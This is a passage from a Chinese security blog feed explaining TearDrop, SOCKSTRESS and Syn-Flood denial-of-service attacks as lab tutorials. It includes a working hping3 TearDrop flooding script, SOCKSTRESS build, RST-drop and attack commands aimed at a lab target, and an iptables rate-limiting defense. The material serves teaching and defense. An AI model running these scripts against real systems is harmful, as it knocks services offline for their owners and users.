<h2 id="0x04-TearDrop攻击原理"><a href="#0x04-TearDrop攻击原理" class="headerlink" title="0x04. TearDrop攻击原理"></a>0x04. TearDrop攻击原理</h2><h4 id="emsp-emsp-写了这么多笔者都快写懵了-，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。"><a href="#emsp-emsp-写了这么多笔者都快写懵了-，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。" class="headerlink" title="&emsp;&emsp;写了这么多笔者都快写懵了:)，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。"></a>&emsp;&emsp;写了这么多笔者都快写懵了:)，但是必须要有上面的知识储备才能真正理解TearDrop形成的原理，所以我还是全部写下来了，还有就是为了以后再来回顾的时候很容易就能看懂，同时给大家普及一点协议方面的知识。</h4><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><h4 id="1-最开始介绍了Fragment-Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况"><a href="#1-最开始介绍了Fragment-Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况" class="headerlink" title="1. 最开始介绍了Fragment Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况"></a>1. 最开始介绍了Fragment Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况</h4><h4 id="2-假如正常情况下第一片传输了1480-byte的数据，那么第二片的Fragment-Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误"><a href="#2-假如正常情况下第一片传输了1480-byte的数据，那么第二片的Fragment-Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误" class="headerlink" title="2. 假如正常情况下第一片传输了1480 byte的数据，那么第二片的Fragment Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误"></a>2. 假如正常情况下第一片传输了1480 byte的数据，那么第二片的Fragment Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误</h4><h4 id="3-但是，如果hacker主动修改第二片的Fragment-Offset，让Fragment-Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的"><a href="#3-但是，如果hacker主动修改第二片的Fragment-Offset，让Fragment-Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的" class="headerlink" title="3.但是，如果hacker主动修改第二片的Fragment Offset，让Fragment Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的"></a>3.但是，如果hacker主动修改第二片的Fragment Offset，让Fragment Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的</h4><h4 id="4-然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了"><a href="#4-然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了" class="headerlink" title="4.然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了"></a>4.然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了</h4><blockquote>
<p>[*]下面是笔者修改后的shell脚本，主要就是利用hping3来发送修改Fragment Offset后的包到目标机器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$#</span> -eq 1</div><div class="line"><span class="keyword">then</span></div><div class="line">	<span class="keyword">for</span>((i=100;i&lt;150;i++))</div><div class="line">		<span class="keyword">do</span></div><div class="line">			hping3 <span class="variable">$1</span> -1 -x -d 1000 -N <span class="variable">$i</span> -c 1</div><div class="line">			hping3 <span class="variable">$1</span> -1 -d 200 -g 400 -N <span class="variable">$i</span> -c 1</div><div class="line">		<span class="keyword">done</span></div><div class="line"><span class="keyword">else</span></div><div class="line">	<span class="built_in">echo</span> <span class="string">"[*]YOU SHOULD DO LIKE THIS: ./teardrop [target_IP]"</span></div><div class="line">	<span class="built_in">echo</span> <span class="string">"[*]please enter again!!"</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure></p>
</blockquote>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。"><a href="#emsp-emsp-学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。" class="headerlink" title="&emsp;&emsp;学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。"></a>&emsp;&emsp;学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SOCKSTRESS]]></title>
      <url>/2017/09/23/SOCKSTRESS/</url>
      <content type="html"><![CDATA[<h2 id="0x00-SOCKSTRESS攻击简介"><a href="#0x00-SOCKSTRESS攻击简介" class="headerlink" title="0x00. SOCKSTRESS攻击简介"></a>0x00. SOCKSTRESS攻击简介</h2><h4 id="emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。"><a href="#emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。" class="headerlink" title="&emsp;&emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。"></a>&emsp;&emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。</h4><a id="more"></a>
<hr>
<h2 id="0x01-SOCKSTRESS攻击原理"><a href="#0x01-SOCKSTRESS攻击原理" class="headerlink" title="0x01. SOCKSTRESS攻击原理"></a>0x01. SOCKSTRESS攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/WEBRESOURCE8d0ba39bc433eeb905b6ad6db08ee003/1559" alt="image"></p>
<h3 id="上篇文章已经给大家介绍过TCP-IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理"><a href="#上篇文章已经给大家介绍过TCP-IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理" class="headerlink" title="上篇文章已经给大家介绍过TCP/IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理"></a>上篇文章已经给大家介绍过TCP/IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理</h3><h4 id="emsp-emsp-1-首先，攻击者大量请求建立三次握手连接"><a href="#emsp-emsp-1-首先，攻击者大量请求建立三次握手连接" class="headerlink" title="&emsp;&emsp;1.首先，攻击者大量请求建立三次握手连接"></a>&emsp;&emsp;1.首先，攻击者大量请求建立三次握手连接</h4><h4 id="emsp-emsp-2-成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源"><a href="#emsp-emsp-2-成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源" class="headerlink" title="&emsp;&emsp;2.成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源"></a>&emsp;&emsp;2.成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源</h4><h4 id="emsp-emsp-3-当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网"><a href="#emsp-emsp-3-当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网" class="headerlink" title="&emsp;&emsp;3.当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网"></a>&emsp;&emsp;3.当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网</h4><h3 id="下面是attacker发向server的一个ACK包，window被置为了0"><a href="#下面是attacker发向server的一个ACK包，window被置为了0" class="headerlink" title="[*]下面是attacker发向server的一个ACK包，window被置为了0"></a>[*]下面是attacker发向server的一个ACK包，window被置为了0</h3><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/3AA80062D00C4DB7BC40609FB312723E/1691" alt="image"></p>
<hr>
<h2 id="0x02-SOCKSTRESS攻击实战"><a href="#0x02-SOCKSTRESS攻击实战" class="headerlink" title="0x02. SOCKSTRESS攻击实战"></a>0x02. SOCKSTRESS攻击实战</h2><h4 id="emsp-emsp-这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。"><a href="#emsp-emsp-这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。" class="headerlink" title="&emsp;&emsp;这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。"></a>&emsp;&emsp;这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-SOCKSTRESS攻击脚本"><a href="#emsp-emsp-1-SOCKSTRESS攻击脚本" class="headerlink" title="&emsp;&emsp;1. SOCKSTRESS攻击脚本"></a>&emsp;&emsp;1. SOCKSTRESS攻击脚本</h4><h4 id="emsp-emsp-2-kali-linux"><a href="#emsp-emsp-2-kali-linux" class="headerlink" title="&emsp;&emsp;2. kali linux"></a>&emsp;&emsp;2. kali linux</h4><h4 id="emsp-emsp-3-metasploit靶机-IP-192-168-1-104"><a href="#emsp-emsp-3-metasploit靶机-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;3. metasploit靶机 IP=192.168.1.104"></a>&emsp;&emsp;3. metasploit靶机 IP=192.168.1.104</h4><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h4 id="1-下载Github上面的SOCKSTRESS攻击脚本并安装"><a href="#1-下载Github上面的SOCKSTRESS攻击脚本并安装" class="headerlink" title="1.下载Github上面的SOCKSTRESS攻击脚本并安装"></a>1.下载Github上面的SOCKSTRESS攻击脚本并安装</h4><blockquote>
<p>git clone <a href="https://github.com/defuse/sockstress" target="_blank" rel="external">https://github.com/defuse/sockstress</a> &amp;&amp; cd sockstress/ &amp;&amp; make</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/BEC0232B6B914CE38A3331BCCBE51018/1612" alt="image"></p>
<h4 id="2-设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）"><a href="#2-设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）" class="headerlink" title="2.设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）"></a>2.设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）</h4><blockquote>
<p>iptables -A OUTPUT -p TCP <strong>-</strong>-tcp-flags rst rst -d xx.xx.xx.xx -j DROP</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/406BA39543DB482FB7FBBEAF43381AE2/1627" alt="image"></p>
<h4 id="3-运行SOCKSTRESS攻击脚本，攻击靶机的80端口"><a href="#3-运行SOCKSTRESS攻击脚本，攻击靶机的80端口" class="headerlink" title="3.运行SOCKSTRESS攻击脚本，攻击靶机的80端口"></a>3.运行SOCKSTRESS攻击脚本，攻击靶机的80端口</h4><blockquote>
<p>./sockstress xx.xx.xx.xx:80 eth0 -p payloads/http -d 100</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/A6C4BCBC67454DCBB7C54DAD971815D8/1635" alt="image"></p>
<h4 id="4-查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机"><a href="#4-查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机" class="headerlink" title="4.查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机"></a>4.查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机</h4><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/8E823BF4397E4832A5CD0610084DCFE8/1637" alt="image"></p>
<hr>
<h2 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03. 防御措施"></a>0x03. 防御措施</h2><h3 id="emsp-emsp-对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了"><a href="#emsp-emsp-对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了" class="headerlink" title="&emsp;&emsp;对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了"></a>&emsp;&emsp;对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了</h3><blockquote>
<p>iptables -I INPUT -p tcp <strong>-</strong>-dport 80 -m state <strong>-</strong>-state NEW -m recent <strong>-</strong>-set &amp;&amp; iptables -I INPUT -p tcp <strong>-</strong>-dport 80 -m state <strong>-</strong>-state NEW -m recent  <strong>-</strong>-update <strong>-</strong>-seconds 30 <strong>-</strong>-hitcount 10 -j DROP</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/4EF59A94649B42AA8AF65632AEFC9EBC/1664" alt="image"></p>
<h4 id="可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。"><a href="#可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。" class="headerlink" title="可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。"></a>可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。</h4><hr>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending-a-problem-doesn’t-exist-won’t-make-it-go-away"><a href="#emsp-emsp-不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending-a-problem-doesn’t-exist-won’t-make-it-go-away" class="headerlink" title="&emsp;&emsp;不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending a problem doesn’t exist won’t make it go away."></a>&emsp;&emsp;不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending a problem doesn’t exist won’t make it go away.</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Syn-Flood]]></title>
      <url>/2017/09/21/Syn-Flood/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Syn-Flood攻击简介"><a href="#0x00-Syn-Flood攻击简介" class="headerlink" title="0x00. Syn-Flood攻击简介"></a>0x00. Syn-Flood攻击简介</h2><h4 id="emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"><a href="#emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。" class="headerlink" title="&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"></a>&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。</h4><a id="more"></a>
<hr>
<h2 id="0x01-TCP-IP三次握手"><a href="#0x01-TCP-IP三次握手" class="headerlink" title="0x01. TCP/IP三次握手"></a>0x01. TCP/IP三次握手</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/WEBRESOURCE82141cc79b8be8e533232aadf09ffc3b/1390" alt="image"></p>
<h4 id="1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。"><a href="#1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。" class="headerlink" title="1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。"></a>1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</h4><h4 id="2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。"><a href="#2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。" class="headerlink" title="2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。"></a>2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。</h4><h4 id="3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"><a href="#3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。" class="headerlink" title="3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"></a>3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</h4><h4 id="下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。"><a href="#下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。" class="headerlink" title="[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。"></a>[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5AA8915F1F464491970B2512AD2C1325/1394" alt="image"></p>
<hr>
<h2 id="0x02-Syn-Flood攻击原理"><a href="#0x02-Syn-Flood攻击原理" class="headerlink" title="0x02. Syn-Flood攻击原理"></a>0x02. Syn-Flood攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/38040545EAD640A5B8D161A4EDB2E087/1407" alt="image"></p>
<h3 id="上图简要介绍了Syn-Flood攻击过程"><a href="#上图简要介绍了Syn-Flood攻击过程" class="headerlink" title="上图简要介绍了Syn-Flood攻击过程"></a>上图简要介绍了Syn-Flood攻击过程</h3><h4 id="1-攻击者先向目标机发送SYN包，请求建立TCP连接"><a href="#1-攻击者先向目标机发送SYN包，请求建立TCP连接" class="headerlink" title="1.攻击者先向目标机发送SYN包，请求建立TCP连接"></a>1.攻击者先向目标机发送SYN包，请求建立TCP连接</h4><h4 id="2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包"><a href="#2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包" class="headerlink" title="2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包"></a>2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包</h4><h4 id="3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"><a href="#3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了" class="headerlink" title="3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"></a>3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了</h4><h4 id="4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦"><a href="#4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦" class="headerlink" title="4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)"></a>4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)</h4><hr>
